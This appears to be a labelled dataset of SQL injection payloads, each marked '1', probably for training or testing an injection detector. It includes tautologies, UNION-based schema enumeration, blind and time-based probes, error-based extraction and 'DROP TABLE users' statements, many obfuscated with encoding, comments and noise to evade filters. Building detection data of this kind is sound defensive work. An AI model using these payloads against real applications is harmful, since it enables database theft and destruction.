"' OR '1'='1", 1
"' OR 1=1 --", 1
"' AND 1=1 --", 1
"' UNION SELECT 1,2,3--", 1
"' UNION SELECT null, null, null --", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --", 1
"1' AND substring(database(), 1, 1) = 's' --", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"; DROP TABLE users; --", 1
"; SELECT pg_sleep(5); --", 1
"WAITFOR DELAY '0:0:5'--", 1
"' OR EXISTS(SELECT 1 FROM users)--", 1
"' AND 1=convert(int,@@version)--", 1
"' AND extractvalue(1,concat(0x5c,version()))--", 1
"admin' OR '1'='1", 1
"1) UNION SELECT 1,database(),3--", 1
"1)) UNION SELECT 1,database(),3--", 1
"1 AND 1=1", 1
"test' OR '1'='1' /*", 1
"test' OR '1'='1' --", 1
";%20%20%20%20%20DROP%20%20%20%20%20TABLE%20%20%20%20%20users;%20%20%20%20%20--", 1
"1%29 UNI%4fN SELECT%201,database(),3-%2d", 1
"1' AND substring(database(), 1, 1) = 's' ----lfy109vwuty4y", 1
"%u0027UNION%0aSELECT1,2,3--", 1
"test%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"%27/*!12345*/AND%2%30%65xtractv%61lue(1,c%6fncat(0x5%63,ve%72sion())) # more_noise--", 1
"1' uNIoN seLECt tabLE_namE, NuLl, NULl FroM InFOrmATioN_sChEMA.TaBles ----qjg3vxlnrd", 1
"te%53t'%20Or/*!*/'1'='1' /* -- r%41%4edom_nOISe", 1
"admin'||/*%0a*/(1=1)'1'='1/*%0d%0a*/", 1
"Test' Or '1'<='1' /*#xqx467c5vr2o", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"1%29%25u0020UNION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3--", 1
"admin%27%20OR%20%271%27%3D%271 # more_noise", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020--", 1
"1'%20%20%20%20OR%20%2%30%%320%20IF(substring(%64atabas%65(),%20%%320%2%30%201,%20%2%30%2%30%201)  =  %27a',%20%20%20%2%30SLEEP(5),%20%20%20%20%30)%20%20%%320%20--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"tEsT' or '1'='1' /* AND 'a'='a'", 1
"1'ORasci%69(subst%72in%67%28dat%61base(),/*%0d%0a*/1,1))>100 OR %27b'='b%27--", 1
"1)%20UNION%20SELECT%201,database(),3--", 1
"%27%20OR%20%271%27%3D%271", 1
"1)%20UNION%20SELECT%201,database(),3----m040ljugr8", 1
"a%64min%27OR%0a%271%27%3D%27%31%0d%0a", 1
"admin'/*!12345*/OR '1'LIKE'1#prjl3w", 1
"' AND 1=1  OR 'b'='b'--", 1
"'/*%2a/OR%09%09%%30%39%091  =%091%%30%39%09%09%09--%09%09%09%09", 1
"1'/*!*/AND substring(database(), 1, 1) = 's'  /*!*/AND 1=1--", 1
"'/**/AND 1=convert(int,@@version) AND 'a'='a'--", 1
"1%27%2%30O%52%20ascii%2%38subs%74ring%28database%28%29%2C%%3201%2C%%3201%29%2%39%20%3E%20100%20--", 1
"WAITFOR%2520DELAY%2520%25270%3A0%3A5%2527--", 1
"%27%20AND%201%3D1%20%20%2F%2A%21%2A%2FAND%201%3D1--%20", 1
"%27%2F%2A%2A%2FA%254eD%20extractvalue%2528%2531%2Cconcat%25280x5c%2Cversion%28%2529%29%29--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A--lftscl", 1
"' OR '1'='1#ihn2nwjdvdc5", 1
"1)) UNION %53ELEC%54 1%2cdatabase(),3%2d-", 1
"1))/**/UNION%20%20SELECT%20%201,database(),3%20%20--%20%20random_noise--", 1
"'%20%20%20%20AND%20%20%20%201%09=", 1
"convert(int,@@version)--", 1
"'/*!12345*/OR '1'='1", 1
"WAITFOR%20DELAY%20%270:0:5%27--", 1
"1'			Or			if(sUBstRiNG(DatABASe(),			1,			1)  IN (1)%09'a',			SleEP(5),			0)			--", 1
"; DROP TABLE users; --#9min5aadomlcv", 1
";DRO%50TAB%4cEus%65rs;", 1
"--#d2qtvm5q9%62khkzw", 1
"waItFOr/**/del%41Y/**/'%30:0:%35'--", 1
"%31/**/&& (%31=1)1=1--%77%70uj3jya6knba", 1
"1)%%320%55N%49ON%20SELECT%201,database(),3-%2d -- random_noise", 1
"1) UNION SELECT 1,database(),3 /*!*/AND 1=1--", 1
"' AND 1=convert(int,@@version)----z1lkida6t6z", 1
"'/**/AND/**/1=%31/**/%2d-/**/", 1
"; SELECT pg_sleep(5); ----42h7pmcgcq0666", 1
";%20DROP%20TABLE%20users;%20--#k2cpm5j6", 1
"1%20A%4eD%201%3E%%33D1", 1
"1%29uNI%254fn%250%2561S%2565LECT%250a1%2CdAtAB%2561sE%28%29%2C3--%2F%2A%250a%2A%2F", 1
"%27%20UN/*!*/ION%20SELECT%201,2,3 OR 'b'='b'--", 1
"; D%52%4fP T%41BLE users; --", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020 AND 'a'='a'--", 1
"test%27%20OR%20%271%27%3D%271%27%20%20%20%20OR%20%20%20'b' =	'b'--%20", 1
"%u0027			AND			1%20=	1			--", 1
"WAITFOR/**/DELAY%20%20%20%20%270:0:5%27--", 1
"' and 1>=1 --", 1
"WAITFOR/**/DE%4cAY%09%270:%30:5'--", 1
"; se%4cecT %70%47%5fslEep(5); ----y2hXczq5vA", 1
"te%73t%27/**/O%52/**/%27%31%27%3D%271%27/%2a*/--/**/", 1
"%27%20A/**/ND%201%3Dconvert(int,@@version)--", 1
"aDMIn%27%20OR%20%271%27%3D%271", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27--", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--", 1
"%u0027%u0020aND%u00201=conVERt(inT,@@vErsIOn)--", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%20OR%20%27b%27%3D%27b%27--%25u0020", 1
"WAITFOR DELAY '0:0:5' -- random_noise--#h8bwa9gc", 1
"'OR1=1%0a--", 1
"1))%u0020%55NIO%4e%u0020SEL%45CT%u00201,database(),%33 -- random_noise--", 1
"WAITFOR%u0020%u0020DELAY%u0020%u0020%u00270:0:5%u0027--", 1
"' OR '1'='1 OR 'b'='b'--un662g67cu", 1
"'/**/AND/**/1=convert(int,@@version)----n4q50km", 1
"WAITFOR/**/    DELAY     '0:0:5'--", 1
"%27%20AN%2544%201%3D1%20-%252d%20", 1
"'/**/OR/**/1LIKE1/**/--/**/", 1
"%3B%20DROP%20TABLE%20users%3B%20--", 1
"1%27%20oR%20ASCiI(SUbSTring(DAtaBasE(),%201,%201))%20%3E%20100%20--", 1
"%2%37%%320AND%20ex%74ractva%6cue%281%2Cconcat%280x5c%%32Cvers%69on%28%29%29%29--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#1hp8nznp8i8k", 1
"1%u0027%u0020Or%u0020if(SubsTrInG(DatabASE(),%u00201,%u00201)LIKE%u0027a%u0027,%u0020SLeeP(5),%u00200)%u0020%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--", 1
"1%27%20uNion%20sElECt%20taBLE_Name%2C%20nuLl%2C%20nULL%20FroM%20iNFoRmATIon_scHema.TaBles%20----27xprwq", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--#padzl", 1
"1)%u0%3020UNION%u0%302%30SELECT%u00201,data%62ase()%2c3--%0a%72ando%6d_noise--/*%0d%0a*/", 1
"'%20%20%20%20%20OR%20%20%20%20%201%09=	1%20%20%20%20%20--%20%20%20%20%20#kxn51slvk", 1
"1%u0027%u0020oR%u0020iF(SubSTRING(DATABaSe(),%u00201,%u00201)=%u0027a%u0027,%u0020SleEP(5),%u00200)%u0020--", 1
"%3B%2F%2A%2A%2FDROP%%320TAB%4cE%%320users%3B%20-%2d", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----a63v7htap5", 1
"WAITFOR/*!*/DELAY '0:0:5' OR (1)--", 1
"WAITFORDELAY%270:0:5%27--/*%0a*/", 1
"%u0027%u0020AND%u00201<=1%u0020%2d-%20", 1
"1'ANDsubstri%6e%67(database()%2c%31,", 1
"1)%0a=%27s' /*!*/AND 1=1--", 1
"1%u0020AND%u00201/**/=	1%u0020--%u0020random_noise", 1
"1'%09%09OR%09%09ascii(substring(database(),%09%091,%09%091))%09%09>%09%09100%09%09--", 1
"test%27%20%7C%7C%20%281%3C%3D1%29%271%27%3D%271%27%20%2F%2A", 1
"'OR%0d%0aEXISTS(SELECT1FROMusers)--", 1
"1'          AND          substring(database(),          1,          1)           =%20          's'          --#7ymmwkw9w", 1
"test%27%20OR%20%271%27%3D%25271%27%2520%2F%2A", 1
"' OR 1=1 -- --3vjiauujtl", 1
"' OR EXISTS(SELECT 1 FROM users)--#q5exr9oq8v2", 1
"%25u0027%2F%2A%2A%2FA/**/ND%2F%2A%2A%2Fextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--", 1
"%u0%3027AN%441=1", 1
"--", 1
"%0d%0a", 1
"1/**/AND/%2a*/1%3D%31-%2dtnfwlg5b1", 1
"1%20AND%20%31%3D1", 1
"'/**/oR exIsTS(sELEcT 1 frOm uSeRs)--", 1
"WAITFOR %44ELAY '0:0:%35'-%2d", 1
"test%27%20OR%20%271%27%3D%271%27%20/*", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27----p4ligxn02s6", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"1)UNION%0aSELECT1,database(),3--", 1
"tEsT%27/*!*/OR%20%271%27%3D%271%27%20/*", 1
"%27%2F%2A%21%2A%2FAND%201%3D1%20--%20", 1
"1' AND substring(database(), 1, 1) = 's'  OR 'b'='b'--", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/--", 1
"' OR 1=1 -%2d%20", 1
"' OR EXISTS(SELECT 1 FROM users)----umlpxwh", 1
"' XOR 1LIKE1 --", 1
"1%27/*!*/||%20(1%3D1)ASCii(subsTRIng(Database(),%201,%201))%20%3E%20100%20--", 1
"1'ANDsubstring(database(),1,1) =%20's'%0a--", 1
"'	UN/*!*/ION	SELECT	null,	null,	null	--	#35ewci156", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#sfkfcm296xr", 1
"1%27%20UnIOn%20seLeCT%20TABle_Name,%20NUll,%20Null%20FROm%20informaTioN_scHeMA.taBleS%20--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020 /*!*/AND 1=1--", 1
"; SELECT pg_sleep(5);  OR 'b'='b'--#r6zlmab", 1
"'/**/AND/%2a*/1%20= %63on%76ert%28i%6et%2c@@version) # more_noise--", 1
"TeSt'/**/oR/**/'1'%20=%20'1'/**//*", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20 OR (1)--", 1
"' && (1=1)extractvalue(1,concat(0x5c,version()))--", 1
"%27/**/AND%201%3D1%20--%20--nckbf", 1
"1%u0027%U0020uniON%u0020sEleCT%u0020TABLE_nAmE,%U0020nUll,%U0020NULL%U0020fROM%u0020INForMaTion_scHEmA.tableS%u0020--", 1
"%27%20OR%201%3D1%20--%20", 1
"test%27%20OR%20%271%27%3D%271%27%20 /*!*/AND 1=1--%20", 1
"%u0027%u0020AND%u00201=1%u0020--%u0020", 1
"1'/**/uNIon/**/sEleCt/**/tAble_NaME,/**/nULL,/**/nULl/**/From/**/InFOrmatIoN_SCHema.taBLEs/**/--", 1
"; Se%6cECt PG_SLEEp(5)%3b %2d-", 1
";%09%09%09%09SELECT%09%09%09%09pg_sleep(5);%09%09%09%09 OR 'b'='b'----j1wsze", 1
"'%20anD%20ExtRactValUE(1,coNCat(0x5C,vERsIOn()))--", 1
";/*!12345*/SELECT/**/pg_sleep(5);/**/--", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F%20OR%20%281%29--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--", 1
"1AND", 1
"1=1", 1
"1))/**/UNION/**/SELECT/**/1,database(),3--", 1
"1 && 1=1", 1
"WaitFor%20%20DeLaY%20%20'0:0:5'%20%20/*!*/AND%20%201%09=%201--", 1
"%31)) UNION SELECT 1,database(%29,%33-%2d AND 'a'='a'", 1
"'/*!*/unIon select 1,2,3 And 'A'='A'--", 1
"test%u0027%u0020O/*!*/R%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020", 1
"%u0027UniOnSELecT%0D%0aNUll,nuLL,nULl%0A%U0020and%u0020%u0027a%U0027=%u0027A%U0027--/*%0d%0A*/", 1
"1)%u0020UN/*!*/ION%u0020SELECT%u00201,database(),3--", 1
"admin'%20%4fR'1'	= '1", 1
"'/**/O%52	EXI%53TS(SEL%45CT	1	FROM	users)%2d-", 1
"' XOR extractvalue(1,concat(0x5c,version()))--", 1
"; DROP TABLE users; --#00iroqn2lb", 1
"%27OREXISTS(SELECT1", 1
"FROMusers) -- random_noise--/*%0a*/", 1
"%U0027%u0020And%U00201=CONVErt(iNT,@@version)%u0020#%u0020mORe_NoiSE--", 1
"%u0027%u0020OR%u0020%u00271%u0027LIKE%u00271", 1
"test%27%20O/**/R%20%271%27%3D%271%27%20%20OR%20(1)--%20", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20%20%2F%2A%21%2A%2FAND%201%3D1--%20", 1
"%61%64min' OR '1'='1", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29--", 1
"'/**/UNION/**/SELECT/**/1,2,3--", 1
"%27%%320AND%201%3Dc%6fnvert(int%2c@@versio%6e)--", 1
"'/*!12345*/O%52 '1'=%271", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3C%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"%u0027/**/UnIoN/**/selecT/**/1,2,3--", 1
"%27OR%0d%0a%271%27%3D%271%0a/**/--/**/random_noise", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))%20#%20more_noise--", 1
"%27%20AND%201%3D1%20--%20#87xhh3x", 1
"test'/*!12345*/O%52 '1'='1' %2f*", 1
"' UNION SELECT 1,2,3 OR (1)--", 1
"admin' OR '1'='1 AND 'a'='a'", 1
"'/*!12345*/OR/**/1	=%201/**/--/**/", 1
"1)) %75NIOn sElEcT %31,D%61taBAsE()%2c3--", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020--", 1
";SELE%43%54", 1
"pg_s%6ceep(5);/*%0d%0a*/--#jjmj%38q0nok%0d%0a", 1
"1%27%20%20%20%20%20%20OR%20%20%20%20%20%20ascii(substring(database(),%20%20%20%20%20%201,%20%20%20%20%20%201))%20%20%20%20%20%20%3E%20%20%20%20%20%20100%20%20%20%20%20%20--", 1
"' AND 1=1 -- #9o82ffxghjm18ft", 1
"%3B%2509%2509SELECT%2509%2509pg_sleep%285%29%3B%2509%2509----1tcsfgcaih", 1
"1%u0020AND%u00201%3d1", 1
"1'/*!12345*/Or ascii(suBstrIng(DaTABAse(), 1, 1)) > 100  aND 'A'='a'----4jh9y", 1
"1'AND%0asubstring(database(),1,1)='s'%0a/*!*/AND1=1----cujilj", 1
"admin' || '1'='1", 1
"1%u0020AND%u00201%3D1#d433o7hhe", 1
"'%2f**/AND/**/extrac%74valu%65(1,concat(0x5c,%76ersion%28)))%2d-", 1
"%3B%2520%2544ROP%20TABLE%20users%3B%20%20%23%20more_%256eois%2565-%252d%23ko4bi", 1
"1'				%09O/**/R%09	%09		IF(s%75bstring(da%74abas%65(),					1,%09				1)%20LIKE%09'a',					SLEEP(5%29,					0%29%09				--", 1
"1)UNiOnselEcT1,DATABaSE(),3--/*%0a*/", 1
"WAITFO%52 DEL%41Y '0:0:5'%2d-", 1
"test%2527%2520OR%2520%25271%2527%253D%25271%2527%2520--%2520", 1
"1%20AND%201%3D1--62187y8lvtp", 1
"' AND extractvalue(1,concat(0x5c,version())) OR (1)--", 1
"wAitFoR dElaY '0:0:5'--", 1
";DROP%0d%0aTABLEusers;%0a--", 1
"1'/*!%2a/OR IF(subst%72ing(database(%29, 1, 1)%3e='a', %53LE%45P(5), 0) %2d-", 1
"WAITFO%52	%09DELAY		'0:0:%35'--", 1
"1%25u0027%25u0020UNION%25u0020SELECT%25u0020table_name%2C%25u0020null%2C%25u0020null%25u0020FROM%25u0020information_schema.tables%25u0020%20--%20random_noise--", 1
"1/**/AnD 1=1 OR 'b'='b'", 1
"test%u0027%u0020O/*!*/R%u0020%u00271%u0027LIKE%u00271%u0027%u0020/*", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027--", 1
"'		AND		1%09=  convert(int,@@version)--", 1
"1%29%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cdatabase%28%29%2C3--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'--", 1
"ad%6d%69n'/*!*/OR '1'='1--%34tvci%78ay69vu680", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  OR 'b'='b'----gg0zi2", 1
"'/**/AND    extractvalue(1,concat(0x5c,version()))--", 1
"'%20OR 1IN (1)1 -%2d", 1
"test' OR '1'LIKE'1'  -- random_noise-- --xwsfqpco02a", 1
"1))UNION%0d%0aSELECT%0a1,database(),3--/*%0d%0a*/", 1
"'/**/A/*!12345*/ND/**/1=1/**/--/**/#pzvih4s8ru40", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A--c4vs3ikg0", 1
"1%20AND%201%3D1%2340yoraw6cvs28", 1
"tesT%U0027/*!*/or%u0020%U00271%U0027>=%u00271%U0027%U0020--%u0020", 1
"WAITFOR      DELAY      '0:0:5'--", 1
"%u0027%u0020A/*!12345*/ND%u00201=convert(int,@@version)--", 1
"%u0027%u0020oR%u0020%u00271%u0027%3D%u00271", 1
"1%U0027%u0020or%u0020asCiI(sUbStRInG(DATabaSE(),%u00201,%u00201))%u0020>%u0020100%U0020----O5144yt1", 1
"1' Or if(sUBsTrING(DaTaBAsE(), 1, 1)='A', sleeP(5), 0) --", 1
"1)/**/uNION/**/seLeCt/**/1,dATABASe(),3--", 1
"'  UNION  SELECT  1,2,3 -- random_noise--", 1
"%61dmin'/**/OR/**%2f'1'%3c='1", 1
"test'    OR    '1' =  '1'    /*", 1
"' UNION %53ELECT null, %6eu%6cl, null --%20", 1
"'%09%09%09%09%09AND%09%09%09%09%091	=  1%09%09%09%09%09--%09%09%09%09%09", 1
"1%27%2509UnIon%250%2539SeLECT%250%2539Ta%2542LE_NAME%2C%2509NUlL%2C%2509nULl%2509f%2572oM%250%2539infoRmA%2554io%256e_sCHEmA.TA%2562leS%2509%252d-", 1
"'aNd1=1%0d%0a--", 1
"admin%2527%2520OR%2520%25271%2527%253D%25271OR%250a%27b%27%3D%27b%27%250a", 1
"1/**/AND/**/1=1", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----z6kxn3wsd", 1
";%20SELECT%20pg_sleep(5);%20--", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"1' && (1=1)substring(database(), 1, 1) = 's'  # more_noise--#yym5bdylt4v1", 1
"%27%20%20AND%20%201%20%20%3D	convert(int,@@version)--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----g7vvg3s", 1
"te%73t'%2f**/%4fR/*%2a/'1'LIKE'1'/**/--/**/", 1
"' UNION SELECT null,%20%6eull, null %2d%2d", 1
"1AND/*%0a*/1>=1/*%0a*/", 1
"test'/**/OR '1'='1' /*--1p98j9", 1
"1))/*!*/UNION SELECT 1,database(),3--#jqzxz1y8", 1
"test%27/**/OR%20%271%27%3D%271%27%20/*", 1
"1 XOR 1=1 # more_noise#hs8dgn5lcv7p1", 1
"1))%u0020UNION%u0020SELEC%54%u0020%31,database(%29,3--#f%635s%33l6a", 1
"%27%20AND%201%3Dconvert(int,@@version)--", 1
"TesT' or '1'<='1' -- --451x3s3ynb", 1
"1))UNION", 1
"SELECT%0a1,database(),3 XOR (1)--%0a", 1
"test%27%20%7C%7C%20%271%27%3D%271%27%20%2F%2A", 1
"1'/**/AND/**/sUbstriNG(dAtaBASE(),/**/1,/**/1)/**/=/**/'s'/**/--", 1
"1' OR %49F(%73ubs%74ring(databa%73e(),%201, 1)='a%27, SLEEP(5), 0) --", 1
"'/**/OR/**/'1'='1 # more_noise", 1
"test'%20%20OR%20%20'1'	=/**//**/'1'%20%20/*%20%20AND%20%20'a'	=/**//**/'a'", 1
"1) UNiOn SeLECt 1,DatABASe(),3 # more_noise--", 1
"test%27%20OR%20%271%27%3D%271%27%20--%20", 1
"WAITFOR/**/DELAY/**/%u00270:0:5%u0027 # more_noise--", 1
"%27%20A/*!*/ND%20extractvalue(1,concat(0x5c,version()))--", 1
"TEsT%25U0027%25U0020or%25U0020%25U00271%25u0027%3d%25U00271%25U0027%25U0020%2F%2A", 1
"1))		UNION		SELECT		1,database(),3--", 1
"1)%20%55NIO%4e%20SELECT%201,%64%61tabase(),3 -- random_noise--", 1
"1%20AND%201%3D1", 1
"admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271", 1
"'%20%20%20AND%20%20%201/**//**/=%091%20%20%20--%20%20%20", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20%20OR%20%27b%27%3D%27b%27--", 1
"1%27%2F%2A%2A%2FoR%2F%2A%2A%2FasCiI%28suBSTRInG%28DataBAsE%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F OR 'b'='b'--", 1
";SELECT%0apg_sleep(5);--/*%0a*/random_noise--/*%0d%0a*/", 1
"'/**/O/*!12345*/R/**/1=1/**/--/**/", 1
"%27%2520%2520%2520%2520UNiOn%2520%2520%2520%2520seLeCT%2520%2520%2520%2520nULL%2C%2520%2520%2520%2520nUll%2C%2520%2520%2520%2520nUlL%2520%2520%2520%2520--%2520%2520%2520%2520", 1
"1%27%20AND%20sUbsTring%28daTABASE%28%29%2C%201%2C%201%29%20%3D%20%27S%27%20--", 1
"'/**/UNION SELECT null, null, null  OR (1)-- --fe2dv5766t", 1
"aDmIn' oR '1'='1", 1
"'/*!*/OR '1'='1", 1
"admin%27%20OR%20%271%27%3D%271", 1
"%27%20AND%201%3D1%20%u0020aNd%u0020%U0027a%U0027=%U0027a%u0027--%20", 1
"%27%20XOR%20EXISTS(SEL/**/ECT%201%20FROM%20users)--", 1
"'/**/&& (1<=1)1=convert(int,@@version)--#sy2a0k1irbq1in", 1
"1 AND 1LIKE1", 1
"test%27%20OR%20%271%27%3D%271%27%20%20--%20random_noise--%20--1dkv6", 1
"test%u0027%u0020OR%u0020%u00271%u0027%3D%u00271%u0027%u0020--%u0020", 1
"' and ExTrActvAlue(1,cOnCaT(0X5c,VerSiOn()))--", 1
"test'%20%4fR '1'='%31' --", 1
"1'/*!*/oR IF(SuBsTRinG(dAtabAse(), 1, 1)='A', SleEp(5), 0) --", 1
"'/**//**//**//**/AND/**//**//**//**/1%20=/**/1/**//**//**//**/--/**//**//**//**/#nbcya", 1
"tesT%U0027%u0020Or%u0020%U00271%U0027%3D%U00271%U0027%u0020--%U0020#r48Ldzn", 1
"WAITFOR/**/DELAY/**/%u00270:0:5%u0027--", 1
"'OR/*%0d%0a*/1=1--", 1
"/*%0a*/", 1
"1%25u0027%25u0020UN/*!*/ION%25u0020SELECT%25u0020table_name%2C%25u0020null%2C%25u0020null%25u0020FROM%25u0020information_schema.tables%25u0020--", 1
"%27%20UNION%20SELECT%201%2C2%2C3--", 1
"'  AND  extractvalue(1,concat(0x5c,version()))--", 1
"%31) %55NION SELECT %31,database(),3-%2d", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20 OR (1)--", 1
"'  OR  EXISTS(SELECT  1  FROM  users)--", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27%20%23%20more_noise--", 1
"%27%20oR%201%3D1%20--%20", 1
"1 XOR %31=1", 1
"1%29%29%20Union%20SeLECt%201%2CDATAbASe%28%29%2C3--#3HkRtSrxsxJgX", 1
"test'	OR	'1'%09=%09'1'	/*", 1
"1)) UNION SELECT 1,database(),3 /*!*/AND 1=1--", 1
"1%25u0027%25u0020OR%25u0020asCIi%28sUBstrInG%28dATAbaSE%28%29%2C%25u00201%2C%25u00201%29%29%25u0020%253E%25u0020100%25u0020--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3/**//*!*/AND/**/1=1--", 1
"' && 1=convert(int,@@version)--", 1
"1'/*!12345*/Or AsCIi(subSTriNG(dAtABASE(), 1, 1)) > 100 --", 1
"; DROP TABLE users;  OR (1)--", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27#/*%0a*/more_noise--%0a", 1
"1%u0027/*!12345*/AND%u0020substring(database(),%u00201,%u00201)%u0020>=%u0020%u0027s%u0027%u0020----jtkwk63574qa", 1
"%2527AND1%253D1%250d%250a--%250d%250a", 1
"%u0027%u0020aNd%u00201=1%u0020%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--%u0020", 1
"WAITFOR%2F%2A%21%2A%2FDELAY%20%270%3A0%3A5%27--", 1
"'/**/and 1=1 --", 1
"test' OR '%31'='1'%20/*", 1
"1aNd", 1
"1%20= 1", 1
"test%27%20OR%20%271%27%3D%271%27%20/*/**/AND/**/'a'='a'", 1
"'AND/*%0a*/1=convert(int,@@version)AND'a'='a'--%0a", 1
"test'OR/*%0d%0a*/'1'LIKE'1'/*%0a*/--", 1
";/**/SELECT/**/pg_sleep(5);/**/--", 1
"%27AND%2F%2A%25%2530d%250a%2A%252f%2565xtractvalue%281%2Cco%256ecat%280%25785c%2Cversio%256e%28%29%29%29--%2F%2A%250d%250a%2A%252f", 1
"' || eXIStS(seLecT 1 FROm users)--", 1
"1'%20||%20IF(substring(database(),%201,%201)<%09=%09'a',%20SLEEP(5),%200)%20--#pvgkorqzd90aw9", 1
"1))/*!*/UNIONSELECT%0d%0a1,database(),3--%0d%0a", 1
"1'   uNiON   sELeCt   TabLe_nAmE,   Null,   NuLl   FRoM   inFoRmation_schEMa.tAbLES   --", 1
"1'/*!12345*/AND substring(database(), 1, 1) = 's' --#i8jexs65qqxj2k9", 1
"%u0027/**/AND/**/extractvalue(1,concat(0x5c,version()))--", 1
"'AND%0a1	=  convert(int,@@version)--", 1
"1'/**/UNIONSELECTtable_name,null,/*%0a*/nullFROM%0d%0ainformation_schema.tables--", 1
"%25u0027%25u0020O%2F%2A%21%2A%2FR%25u00201%3D1%25u0020--%25u0020#oqxrjm", 1
"WAITFORDELAY%270%3A0%3A5%27--%0A", 1
"1%u0027%u0020%4f%52%u00%320IF(%73ubstring%28d%61tabas%65(),%u%300201,%u00%3201)=%u0027a%%750027,%u0020SLEE%50(5),%%7500200)%u0020%u0020#%u0020more_noise--", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#yuna0j", 1
"%25u0027%2f%2a%2112345%2A%2fUnIon%25U0020sELECt%25U0020nulL%2c%25u0020nUlL%2c%25U0020nULL%25u0020--%25U0020", 1
"' XOR extractva%6cue(1,%63onc%61t(%30x5c,versio%6e()))--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--#txof9whe5cz4vct", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20 /*!*/AND 1=1--", 1
"1'%20A%4eD s%75bstring(da%74abase(), 1%2c 1) = 's' --", 1
"%3B%2F%2A%2112345%2A%2FSELECT%20pg_sleep%285%29%3B%20--", 1
"1  AND  1	=%091#qslaq6mjh", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3--", 1
"'UNIONSELECT%0a1,2,3/*!*/AND1=1--#nqcdwdy5liy", 1
"%27%20AND%201%3D1%20--%20", 1
"1%29uNiOn%0AsELEcT1%2cDatAbaSe%28%29%2c3--", 1
"test' OR '1'='1' /*#ggycjw", 1
"tesT%27%20Or%20%271%27%3d%271%27%20/*", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#dylhn", 1
"test'/**/OR/**/'1'='1'/**//*/**/#/**/more_noise", 1
"%u0027/**/UNION/**/SELECT/**/1,2,3--", 1
"'				AND				extractvalue(1,concat(0x5c,version()))--#tayv80lmzsoeufn", 1
"; SELECT pg_sleep(5); --#6k5obijy1sk", 1
"1%27%20UN/*!12345*/ION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#jf8vemfkx9", 1
